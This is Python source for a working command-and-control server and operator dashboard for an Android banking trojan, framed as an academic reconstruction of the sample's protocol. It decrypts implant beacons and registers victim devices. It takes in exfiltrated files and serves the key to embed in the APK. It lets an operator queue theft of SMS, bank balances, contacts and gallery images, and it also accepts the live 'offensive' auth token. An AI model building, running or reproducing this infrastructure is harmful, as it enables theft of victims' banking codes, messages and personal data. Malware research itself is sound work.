"""
VexR C2 Backend — Academic Lab Reconstruction
==============================================

Reconstructed from static analysis of D_Kyt7.apk (com.VexR.app v1.1).
Implements the exact uplink protocol used by the sample:

  Client (APK)                          Server (this)
  ─────────────────────────────────────────────────────────────────────
  AES-256 key + 16-byte IV generated
  d = Base64( AES/CBC/PKCS5(data) )  ──►  RSA-decrypt k -> AES key
  k = Base64( RSA(aes_key) )         ──►  AES-decrypt d    -> payload
  i = Base64( IV )                   ──►  store + respond
                                          pending_commands <── pull channel

Original crypto (decompiled, a/wg1.java):
  - RSA/ECB/PKCS1Padding for key transport (X.509 SubjectPublicKeyInfo)
  - AES/CBC/PKCS5Padding for payload, per-message random key + IV
  - envelope: v=3&d=...&k=...&i=...

Run:  uvicorn server:app --host 0.0.0.0 --port 8000
"""

from __future__ import annotations

import base64
import json
import os
import sqlite3
import time
from contextlib import contextmanager
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from fastapi import FastAPI, Query, Request
from fastapi.responses import HTMLResponse, JSONResponse
from pydantic import BaseModel

BASE_DIR = Path(__file__).resolve().parent
DB_PATH = BASE_DIR / "vexr_lab.db"
PRIVATE_KEY_PATH = BASE_DIR / "server_private.pem"
PUBLIC_KEY_PATH = BASE_DIR / "server_public.pem"

# Auth tokens for the VexR C2 server.
# - Academic token: VexR_Lab_Academic_Token_2026 (used in academic builds)
# - Offensive token: VexR_Auth_99x_2026_Secured (extracted from native library in offensive build)
# Both tokens are accepted for maximum compatibility.
AUTH_TOKENS = ["VexR_Auth_99x_2026_Secured", "VexR_Lab_Academic_Token_2026"]
SUDO_PORT = "EeILBT"  # from assets/sudoport.txt

# ---------------------------------------------------------------------------
# Database
# ---------------------------------------------------------------------------

SCHEMA = """
CREATE TABLE IF NOT EXISTS devices (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT UNIQUE NOT NULL,
    model         TEXT,
    android_ver   TEXT,
    first_seen    TEXT NOT NULL,
    last_seen     TEXT NOT NULL,
    beacon_count  INTEGER NOT NULL DEFAULT 0
);

CREATE TABLE IF NOT EXISTS beacons (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    action        TEXT,
    payload       TEXT,
    received_at   TEXT NOT NULL,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS files (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    filename      TEXT,
    size_bytes    INTEGER,
    received_at   TEXT NOT NULL,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS commands (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    device_key    TEXT NOT NULL,
    command       TEXT NOT NULL,
    params        TEXT,
    status        TEXT NOT NULL DEFAULT 'pending',
    created_at    TEXT NOT NULL,
    sent_at       TEXT,
    FOREIGN KEY (device_key) REFERENCES devices(device_key)
);

CREATE TABLE IF NOT EXISTS log (
    id            INTEGER PRIMARY KEY AUTOINCREMENT,
    ts            TEXT NOT NULL,
    level         TEXT NOT NULL,
    message       TEXT NOT NULL
);
"""


@contextmanager
def db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    try:
        yield conn
        conn.commit()
    finally:
        conn.close()


def init_db() -> None:
    with db() as conn:
        conn.executescript(SCHEMA)


def log(level: str, message: str) -> None:
    with db() as conn:
        conn.execute(
            "INSERT INTO log (ts, level, message) VALUES (?, ?, ?)",
            (datetime.now(timezone.utc).isoformat(), level, message),
        )


def utcnow() -> str:
    return datetime.now(timezone.utc).isoformat()


# ---------------------------------------------------------------------------
# Crypto — mirrors a/wg1.java exactly
# ---------------------------------------------------------------------------


class ProtocolCrypto:
    """Server-side counterpart of the implant's crypto."""

    def __init__(self) -> None:
        self._private_key = serialization.load_pem_private_key(
            PRIVATE_KEY_PATH.read_bytes(), password=None
        )
        self.public_key_b64 = base64.b64encode(
            self._private_key.public_key().public_bytes(
                encoding=serialization.Encoding.DER,
                format=serialization.PublicFormat.SubjectPublicKeyInfo,
            )
        ).decode()

    def decrypt(self, envelope: dict[str, str]) -> dict[str, Any]:
        """Decrypt a v=3&d=&k=&i= envelope into the original payload dict."""
        encrypted_key = base64.b64decode(envelope["k"])
        encrypted_data = base64.b64decode(envelope["d"])
        iv = base64.b64decode(envelope["i"])

        # 1. RSA/ECB/PKCS1 -> recover the per-message AES-256 key
        aes_key = self._private_key.decrypt(
            encrypted_key,
            padding.PKCS1v15(),
        )

        # 2. AES/CBC/PKCS5 -> recover the payload
        decryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).decryptor()
        padded = decryptor.update(encrypted_data) + decryptor.finalize()
        plaintext = _pkcs5_unpad(padded)

        return json.loads(plaintext.decode("utf-8"))

    def encrypt(self, payload: dict[str, Any]) -> dict[str, str]:
        """Encrypt a response payload using the same envelope (for testing)."""
        aes_key = os.urandom(32)
        iv = os.urandom(16)
        plaintext = json.dumps(payload).encode()

        encryptor = Cipher(algorithms.AES(aes_key), modes.CBC(iv)).encryptor()
        padded = _pkcs5_pad(plaintext)
        encrypted = encryptor.update(padded) + encryptor.finalize()

        enc_key = self._private_key.public_key().encrypt(aes_key, padding.PKCS1v15())

        return {
            "v": "3",
            "d": base64.b64encode(encrypted).decode(),
            "k": base64.b64encode(enc_key).decode(),
            "i": base64.b64encode(iv).decode(),
        }


def _pkcs5_pad(data: bytes, block: int = 16) -> bytes:
    padlen = block - (len(data) % block)
    return data + bytes([padlen]) * padlen


def _pkcs5_unpad(data: bytes) -> bytes:
    if not data:
        return data
    padlen = data[-1]
    if padlen < 1 or padlen > 16 or padlen > len(data):
        return data
    return data[:-padlen]


crypto = ProtocolCrypto()

# ---------------------------------------------------------------------------
# Device registry
# ---------------------------------------------------------------------------


def register_device(payload: dict[str, Any]) -> str:
    """Upsert a device from its beacon payload; returns the device key."""
    device_key = payload.get("device_id") or payload.get("imei") or "unknown"
    model = payload.get("model") or payload.get("device_model")
    android_ver = payload.get("android_version") or payload.get("sdk")

    with db() as conn:
        row = conn.execute(
            "SELECT id FROM devices WHERE device_key = ?", (device_key,)
        ).fetchone()
        if row is None:
            conn.execute(
                "INSERT INTO devices (device_key, model, android_ver, first_seen, last_seen, beacon_count)"
                " VALUES (?, ?, ?, ?, ?, 1)",
                (device_key, model, android_ver, utcnow(), utcnow()),
            )
        else:
            conn.execute(
                "UPDATE devices SET last_seen = ?, beacon_count = beacon_count + 1,"
                " model = COALESCE(?, model), android_ver = COALESCE(?, android_ver)"
                " WHERE device_key = ?",
                (utcnow(), model, android_ver, device_key),
            )
    return device_key


def queue_pending_commands(device_key: str) -> list[str]:
    """Return and mark-sent all queued commands for a device."""
    with db() as conn:
        rows = conn.execute(
            "SELECT id, command, params FROM commands"
            " WHERE device_key = ? AND status = 'pending'",
            (device_key,),
        ).fetchall()
        for row in rows:
            conn.execute(
                "UPDATE commands SET status = 'sent', sent_at = ? WHERE id = ?",
                (utcnow(), row["id"]),
            )
    return [row["command"] for row in rows]


# ---------------------------------------------------------------------------
# FastAPI app
# ---------------------------------------------------------------------------

app = FastAPI(
    title="VexR Lab C2",
    description="Academic reconstruction of the VexR banking-trojan C2 protocol",
    version="1.0.0",
)


@app.on_event("startup")
def _startup() -> None:
    init_db()
    log("info", "C2 backend started")


def _authorized(request: Request) -> bool:
    token = request.headers.get("X-Auth-Token")
    return token in AUTH_TOKENS


def _parse_form(body: str) -> dict[str, str]:
    from urllib.parse import parse_qsl

    return dict(parse_qsl(body))


@app.post("/panel.php")
async def panel(request: Request, p: str = Query(default=""), action: str = Query(default="")):
    """Primary uplink endpoint — receives encrypted beacons."""
    if not _authorized(request):
        log("warn", f"unauthorized beacon rejected from {request.client.host}")
        return JSONResponse({"status": "forbidden"}, status_code=403)

    raw = (await request.body()).decode("utf-8", "replace")
    form = _parse_form(raw)

    try:
        payload = crypto.decrypt(form)
    except Exception as exc:  # noqa: BLE001 - log everything, never crash the C2
        log("error", f"decrypt failed: {exc}")
        return JSONResponse({"status": "error", "reason": "decrypt_failed"}, status_code=400)

    device_key = register_device(payload)

    with db() as conn:
        conn.execute(
            "INSERT INTO beacons (device_key, action, payload, received_at) VALUES (?, ?, ?, ?)",
            (device_key, action or payload.get("action"), json.dumps(payload), utcnow()),
        )

    pending = queue_pending_commands(device_key)
    log("info", f"beacon action={action or payload.get('action')} device={device_key}")

    resp: dict[str, Any] = {"status": "ok"}
    if pending:
        resp["pending_commands"] = pending
    return JSONResponse(resp)


@app.post("/file.php")
async def file_upload(request: Request, p: str = Query(default="")):
    """File exfil endpoint (gallery images etc.)."""
    if not _authorized(request):
        return JSONResponse({"status": "forbidden"}, status_code=403)

    raw = (await request.body()).decode("utf-8", "replace")
    form = _parse_form(raw)

    try:
        payload = crypto.decrypt(form)
    except Exception as exc:  # noqa: BLE001
        log("error", f"file decrypt failed: {exc}")
        return JSONResponse({"status": "error"}, status_code=400)

    device_key = register_device(payload)
    filename = payload.get("filename") or payload.get("name") or "unknown"
    size = payload.get("size") or len(json.dumps(payload))

    with db() as conn:
        conn.execute(
            "INSERT INTO files (device_key, filename, size_bytes, received_at) VALUES (?, ?, ?, ?)",
            (device_key, filename, size, utcnow()),
        )
    log("info", f"file received device={device_key} name={filename} size={size}")
    return JSONResponse({"status": "ok"})


# --- Operator API ----------------------------------------------------------


class CommandIn(BaseModel):
    device_key: str
    command: str
    params: Optional[str] = None


@app.post("/api/command")
def api_queue_command(cmd: CommandIn):
    """Operator queues a command for a device (delivered on next beacon)."""
    with db() as conn:
        conn.execute(
            "INSERT INTO commands (device_key, command, params, created_at)"
            " VALUES (?, ?, ?, ?)",
            (cmd.device_key, cmd.command, cmd.params, utcnow()),
        )
    log("info", f"command queued device={cmd.device_key} cmd={cmd.command}")
    return {"status": "queued", "command": cmd.command}


@app.get("/api/devices")
def api_devices():
    with db() as conn:
        devices = [dict(r) for r in conn.execute("SELECT * FROM devices ORDER BY last_seen DESC")]
        for d in devices:
            d["beacons"] = conn.execute(
                "SELECT COUNT(*) AS c FROM beacons WHERE device_key = ?", (d["device_key"],)
            ).fetchone()["c"]
            d["files"] = conn.execute(
                "SELECT COUNT(*) AS c FROM files WHERE device_key = ?", (d["device_key"],)
            ).fetchone()["c"]
            # beacons may arrive before the device row is enriched; fall back to
            # the android_version recorded on the newest beacon
            if not d["android_ver"]:
                row = conn.execute(
                    "SELECT payload FROM beacons WHERE device_key = ? ORDER BY id DESC LIMIT 1",
                    (d["device_key"],),
                ).fetchone()
                if row:
                    try:
                        d["android_ver"] = json.loads(row["payload"]).get("android_version")
                    except Exception:  # noqa: BLE001
                        pass
    return {"devices": devices}


@app.get("/api/beacons")
def api_beacons(limit: int = 100):
    with db() as conn:
        rows = [dict(r) for r in conn.execute(
            "SELECT * FROM beacons ORDER BY id DESC LIMIT ?", (limit,)
        )]
    return {"beacons": rows}


@app.get("/api/log")
def api_log(limit: int = 100):
    with db() as conn:
        rows = [dict(r) for r in conn.execute(
            "SELECT * FROM log ORDER BY id DESC LIMIT ?", (limit,)
        )]
    return {"log": rows}


@app.get("/api/publickey")
def api_publickey():
    """The Base64 X.509 public key to embed in the APK."""
    return {"public_key": crypto.public_key_b64}


# --- Dashboard -------------------------------------------------------------

DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>VexR Lab C2</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#080b10;--surface:#0f1319;--surface2:#161c24;--border:#1c2530;
  --fg:#cdd5de;--fg2:#8b95a3;--fg3:#555e6b;
  --accent:#3de8b0;--accent-dim:rgba(61,232,176,.1);--accent-mid:rgba(61,232,176,.2);
  --warn:#e8a735;--warn-dim:rgba(232,167,53,.12);
  --err:#e5534b;--err-dim:rgba(229,83,75,.12);
  --ok:#3de8b0;
  --radius:8px;
}
html{font-size:14px}
body{background:var(--bg);color:var(--fg);font-family:'Inter',system-ui,-apple-system,sans-serif;
  line-height:1.55;min-height:100vh}
a{color:var(--accent);text-decoration:none}

/* ── Status bar ── */
.topbar{background:var(--surface);border-bottom:1px solid var(--border);
  padding:10px 24px;display:flex;align-items:center;justify-content:space-between;gap:16px;flex-wrap:wrap}
.topbar-left{display:flex;align-items:center;gap:12px}
.logo{font-weight:700;font-size:15px;letter-spacing:-.02em;color:#fff}
.logo span{color:var(--accent)}
.env-badge{font-size:11px;font-weight:600;padding:3px 10px;border-radius:20px;
  background:var(--accent-dim);color:var(--accent);letter-spacing:.03em}
.topbar-right{display:flex;align-items:center;gap:16px;font-size:12px;color:var(--fg2)}
.live-dot{width:7px;height:7px;border-radius:50%;background:var(--accent);display:inline-block;
  animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}

/* ── Layout ── */
.wrap{max-width:1140px;margin:0 auto;padding:24px 20px 60px}

/* ── Stat tiles ── */
.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-bottom:24px}
.stat-tile{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:16px 18px}
.stat-tile .val{font-size:28px;font-weight:700;color:#fff;font-variant-numeric:tabular-nums;line-height:1.2}
.stat-tile .label{font-size:12px;color:var(--fg2);margin-top:2px}
.stat-tile.accent .val{color:var(--accent)}

/* ── Sections ── */
.section{margin-bottom:24px}
.section-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:12px}
.section-title{font-size:14px;font-weight:600;color:#fff}
.section-count{font-size:12px;color:var(--fg3);font-variant-numeric:tabular-nums}

/* ── Tables ── */
.tbl-wrap{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);overflow:hidden}
table{width:100%;border-collapse:collapse;font-size:13px}
thead th{background:var(--surface2);font-weight:500;color:var(--fg2);font-size:11px;
  padding:8px 14px;text-align:left;border-bottom:1px solid var(--border);letter-spacing:.02em}
tbody td{padding:9px 14px;border-bottom:1px solid var(--border);vertical-align:top;color:var(--fg)}
tbody tr:last-child td{border-bottom:none}
tbody tr:hover{background:rgba(61,232,176,.03)}
td.mono{font-family:'SF Mono',SFMono-Regular,Menlo,Consolas,monospace;font-size:12px}
td.trunc{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:500}
.badge-install{background:var(--accent-dim);color:var(--accent)}
.badge-sms{background:rgba(129,140,248,.15);color:#818cf8}
.badge-balance{background:rgba(251,191,36,.12);color:#fbbf24}
.badge-online{background:rgba(52,211,153,.12);color:#34d399}
.badge-file{background:rgba(244,114,182,.12);color:#f472b6}
.badge-warn{background:var(--warn-dim);color:var(--warn)}
.badge-err{background:var(--err-dim);color:var(--err)}

/* ── Command panel ── */
.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:24px}
@media(max-width:700px){.cmd-grid,.stats-row{grid-template-columns:1fr 1fr}.stats-row{grid-template-columns:repeat(2,1fr)}}
@media(max-width:480px){.cmd-grid{grid-template-columns:1fr}}
.cmd-panel{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);padding:18px}
.cmd-panel .section-title{margin-bottom:14px}
.field{margin-bottom:10px}
.field label{display:block;font-size:11px;color:var(--fg2);margin-bottom:4px;font-weight:500}
.field input,.field select{width:100%;padding:8px 10px;background:var(--bg);border:1px solid var(--border);
  border-radius:6px;color:var(--fg);font-family:inherit;font-size:13px;outline:none;transition:border-color .15s}
.field input:focus{border-color:var(--accent)}
.field input::placeholder{color:var(--fg3)}
.btn{display:inline-flex;align-items:center;gap:6px;padding:8px 18px;border:none;border-radius:6px;
  font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s}
.btn-primary{background:var(--accent);color:#060d09}
.btn-primary:hover{background:#5aefc5}
.btn-primary:active{transform:scale(.97)}
.cmd-result{margin-top:10px;padding:8px 10px;background:var(--bg);border-radius:6px;
  font-size:12px;color:var(--fg2);display:none;font-family:'SF Mono',monospace}
.cmd-result.show{display:block}

/* ── Beacon detail ── */
.beacon-payload{margin-top:6px;padding:8px 10px;background:var(--bg);border-radius:4px;
  font-size:11px;font-family:'SF Mono',monospace;color:var(--fg2);max-height:120px;overflow:auto;
  white-space:pre-wrap;word-break:break-all;border:1px solid var(--border)}
.beacon-toggle{font-size:11px;color:var(--accent);cursor:pointer;margin-left:8px}
.beacon-toggle:hover{text-decoration:underline}

/* ── Log ── */
.log-wrap{background:var(--surface);border:1px solid var(--border);border-radius:var(--radius);
  max-height:320px;overflow:auto}
.log-entry{padding:6px 14px;font-size:12px;font-family:'SF Mono',SFMono-Regular,monospace;
  border-bottom:1px solid rgba(28,37,48,.5);display:flex;gap:10px;align-items:baseline}
.log-entry:last-child{border-bottom:none}
.log-entry:hover{background:rgba(255,255,255,.02)}
.log-ts{color:var(--fg3);white-space:nowrap;flex-shrink:0;font-variant-numeric:tabular-nums}
.log-level{font-weight:600;flex-shrink:0;width:36px;text-align:right}
.log-level.info{color:var(--accent)}.log-level.warn{color:var(--warn)}.log-level.error{color:var(--err)}
.log-msg{color:var(--fg);word-break:break-word}

/* ── Empty state ── */
.empty{padding:32px;text-align:center;color:var(--fg3);font-size:13px}
.empty-icon{font-size:24px;margin-bottom:8px;opacity:.5}

/* ── Scrollbar ── */
::-webkit-scrollbar{width:6px;height:6px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--fg3)}

/* ── Responsive ── */
@media(max-width:600px){.topbar{padding:10px 14px}.wrap{padding:16px 12px 40px}
  .stats-row{grid-template-columns:1fr 1fr}.stat-tile .val{font-size:22px}}
</style>
</head>
<body>

<div class="topbar">
  <div class="topbar-left">
    <div class="logo">Vex<span>R</span> Lab C2</div>
    <span class="env-badge">Academic</span>
  </div>
  <div class="topbar-right">
    <span><span class="live-dot"></span>&ensp;Live</span>
    <span id="uptime">–</span>
    <span id="clock">–</span>
  </div>
</div>

<div class="wrap">

  <!-- Stats -->
  <div class="stats-row">
    <div class="stat-tile accent"><div class="val" id="s-devices">–</div><div class="label">Connected devices</div></div>
    <div class="stat-tile"><div class="val" id="s-beacons">–</div><div class="label">Total beacons</div></div>
    <div class="stat-tile"><div class="val" id="s-files">–</div><div class="label">Files received</div></div>
    <div class="stat-tile"><div class="val" id="s-commands">–</div><div class="label">Commands sent</div></div>
  </div>

  <!-- Command + Device select -->
  <div class="cmd-grid">
    <div class="cmd-panel">
      <div class="section-title">Send command</div>
      <div class="field"><label>Target device</label>
        <select id="c-device"><option value="">Select a device…</option></select></div>
      <div class="field"><label>Command</label>
        <select id="c-cmd">
          <option value="allsms">allsms — Extract all SMS</option>
          <option value="balance">balance — Bank balances</option>
          <option value="contacts">contacts — Contact list</option>
          <option value="gallery">gallery — Gallery scan</option>
          <option value="apps">apps — Installed apps</option>
          <option value="discovery">discovery — Full discovery</option>
        </select></div>
      <div class="field"><label>Parameters (optional)</label>
        <input id="c-params" placeholder='{"key": "value"}'></div>
      <button class="btn btn-primary" onclick="sendCmd()">Send command</button>
      <div class="cmd-result" id="c-status"></div>
    </div>

    <div class="cmd-panel">
      <div class="section-title">Protocol info</div>
      <table style="font-size:12px">
        <tr><td style="color:var(--fg2);padding:6px 0;border:none;width:110px">Encryption</td>
            <td style="color:var(--fg);padding:6px 0;border:none">AES-256-CBC + RSA-2048</td></tr>
        <tr><td style="color:var(--fg2);padding:6px 0;border:none">Envelope</td>
            <td style="color:var(--fg);padding:6px 0;border:none;font-family:monospace;font-size:11px">v=3&amp;d=&amp;k=&amp;i=</td></tr>
        <tr><td style="color:var(--fg2);padding:6px 0;border:none">Key transport</td>
            <td style="color:var(--fg);padding:6px 0;border:none">RSA/ECB/PKCS1</td></tr>
        <tr><td style="color:var(--fg2);padding:6px 0;border:none">Uplink</td>
            <td style="color:var(--fg);padding:6px 0;border:none">/panel.php, /file.php</td></tr>
        <tr><td style="color:var(--fg2);padding:6px 0;border:none">Downlink</td>
            <td style="color:var(--fg);padding:6px 0;border:none">FCM push + HTTP poll</td></tr>
        <tr><td style="color:var(--fg2);padding:6px 0;border:none">Auth</td>
            <td style="color:var(--fg);padding:6px 0;border:none">X-Auth-Token header</td></tr>
      </table>
    </div>
  </div>

  <!-- Devices -->
  <div class="section">
    <div class="section-head">
      <span class="section-title">Devices</span>
      <span class="section-count" id="device-count"></span>
    </div>
    <div class="tbl-wrap" id="devices"><div class="empty"><div class="empty-icon">📡</div>Waiting for first beacon…</div></div>
  </div>

  <!-- Beacons -->
  <div class="section">
    <div class="section-head">
      <span class="section-title">Recent beacons</span>
      <span class="section-count" id="beacon-count"></span>
    </div>
    <div class="tbl-wrap" id="beacons"><div class="empty"><div class="empty-icon">📨</div>No beacons received yet</div></div>
  </div>

  <!-- Log -->
  <div class="section">
    <div class="section-head">
      <span class="section-title">Server log</span>
      <span class="section-count" id="log-count"></span>
    </div>
    <div class="log-wrap" id="log"><div class="empty">No log entries</div></div>
  </div>

</div>

<script>
const actionBadge = a => {
  const m = {install:'badge-install',allsms:'badge-sms',balance:'badge-balance',
    online_device:'badge-online',gallery:'badge-file',file_upload:'badge-file',
    contacts:'badge-sms',apps:'badge-install',discovery:'badge-online'};
  return `<span class="badge ${m[a]||''}">${esc(a||'–')}</span>`;
};

function esc(s){const d=document.createElement('div');d.textContent=s??'';return d.innerHTML}

function ago(iso){
  if(!iso)return '–';
  const s=Math.floor((Date.now()-new Date(iso).getTime())/1000);
  if(s<60)return s+'s ago';if(s<3600)return Math.floor(s/60)+'m ago';
  if(s<86400)return Math.floor(s/3600)+'h ago';return Math.floor(s/86400)+'d ago';
}

function shortId(id){return id&&id.length>12?id.slice(0,8)+'…':'–'}

function prettyPayload(raw){
  try{const o=JSON.parse(raw);return JSON.stringify(o,null,2)}catch{return raw||''}
}

let expandedBeacons=new Set();

async function refresh(){
  try{
    const[dev,bec,lg]=await Promise.all([
      fetch('/api/devices').then(r=>r.json()),
      fetch('/api/beacons?limit=30').then(r=>r.json()),
      fetch('/api/log?limit=50').then(r=>r.json()),
    ]);

    const totalBeacons=dev.devices.reduce((a,d)=>a+d.beacons,0);
    const totalFiles=dev.devices.reduce((a,d)=>a+d.files,0);
    document.getElementById('s-devices').textContent=dev.devices.length;
    document.getElementById('s-beacons').textContent=totalBeacons;
    document.getElementById('s-files').textContent=totalFiles;
    document.getElementById('s-commands').textContent=lg.log.filter(l=>l.message.includes('command queued')).length;

    // Device selector
    const sel=document.getElementById('c-device');
    const cur=sel.value;
    const opts='<option value="">Select a device…</option>'+
      dev.devices.map(d=>`<option value="${esc(d.device_key)}"${d.device_key===cur?' selected':''}>${esc(d.model||'Unknown')} (${shortId(d.device_key)})</option>`).join('');
    sel.innerHTML=opts;

    // Devices table
    document.getElementById('device-count').textContent=dev.devices.length+' registered';
    document.getElementById('devices').innerHTML=dev.devices.length
      ?`<table><thead><tr><th>Device</th><th>Model</th><th>Android</th><th>Beacons</th><th>Files</th><th>Last seen</th></tr></thead><tbody>`+
        dev.devices.map(d=>{
          const online=((Date.now()-new Date(d.last_seen).getTime())/1000)<300;
          return `<tr><td class="mono trunc" title="${esc(d.device_key)}">${shortId(d.device_key)}</td>`+
          `<td>${esc(d.model||'–')}</td><td>${d.android_ver||'–'}</td>`+
          `<td style="font-variant-numeric:tabular-nums">${d.beacons}</td>`+
          `<td style="font-variant-numeric:tabular-nums">${d.files}</td>`+
          `<td>${online?'<span class="badge badge-install">online</span>':'<span style="color:var(--fg3)">'+ago(d.last_seen)+'</span>'}</td></tr>`;
        }).join('')+'</tbody></table>'
      :'<div class="empty"><div class="empty-icon">📡</div>Waiting for first beacon…</div>';

    // Beacons
    document.getElementById('beacon-count').textContent=bec.beacons.length+' recent';
    document.getElementById('beacons').innerHTML=bec.beacons.length
      ?`<table><thead><tr><th style="width:50px">#</th><th>Device</th><th>Action</th><th>Time</th><th>Payload</th></tr></thead><tbody>`+
        bec.beacons.map(b=>{
          const expanded=expandedBeacons.has(b.id);
          return `<tr><td class="mono">${b.id}</td>`+
          `<td class="mono trunc" title="${esc(b.device_key)}">${shortId(b.device_key)}</td>`+
          `<td>${actionBadge(b.action)}</td>`+
          `<td style="color:var(--fg3);white-space:nowrap">${ago(b.received_at)}</td>`+
          `<td><span class="beacon-toggle" onclick="togglePayload(${b.id})">${expanded?'hide':'show'}</span>`+
          (expanded?`<div class="beacon-payload">${esc(prettyPayload(b.payload))}</div>`:'')+
          `</td></tr>`;
        }).join('')+'</tbody></table>'
      :'<div class="empty"><div class="empty-icon">📨</div>No beacons received yet</div>';

    // Log
    document.getElementById('log-count').textContent=lg.log.length+' entries';
    const logHtml=lg.log.reverse().map(l=>{
      const lvl=l.level.toLowerCase();
      const time=l.ts?l.ts.slice(11,19):'';
      return `<div class="log-entry"><span class="log-ts">${time}</span>`+
        `<span class="log-level ${lvl}">${lvl}</span><span class="log-msg">${esc(l.message)}</span></div>`;
    }).join('');
    document.getElementById('log').innerHTML=logHtml||'<div class="empty">No log entries</div>';

  }catch(e){console.error('refresh error',e)}
}

function togglePayload(id){
  if(expandedBeacons.has(id))expandedBeacons.delete(id);else expandedBeacons.add(id);
  refresh();
}

async function sendCmd(){
  const dk=document.getElementById('c-device').value;
  const cmd=document.getElementById('c-cmd').value;
  const params=document.getElementById('c-params').value||null;
  const st=document.getElementById('c-status');
  if(!dk){st.textContent='Select a device first.';st.classList.add('show');return}
  try{
    const r=await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({device_key:dk,command:cmd,params})});
    const j=await r.json();
    st.textContent=j.status==='queued'?'Command queued for delivery.':'Error: '+JSON.stringify(j);
    st.classList.add('show');
    refresh();
  }catch(e){st.textContent='Network error: '+e.message;st.classList.add('show')}
}

// Clock
function updateClock(){
  const d=new Date();
  document.getElementById('clock').textContent=d.toLocaleTimeString('en-GB',{hour:'2-digit',minute:'2-digit',second:'2-digit'});
}
setInterval(updateClock,1000);updateClock();

// Uptime
const bootTime=Date.now();
function updateUptime(){
  const s=Math.floor((Date.now()-bootTime)/1000);
  const h=Math.floor(s/3600),m=Math.floor((s%3600)/60);
  document.getElementById('uptime').textContent='Session '+h+'h '+m+'m';
}
setInterval(updateUptime,60000);updateUptime();

refresh();
setInterval(refresh,4000);
</script>
</body>
</html>"""


@app.get("/", response_class=HTMLResponse)
def dashboard():
    return DASHBOARD_HTML


@app.get("/health")
def health():
    return {"status": "ok", "time": utcnow(), "sudo_port": SUDO_PORT}
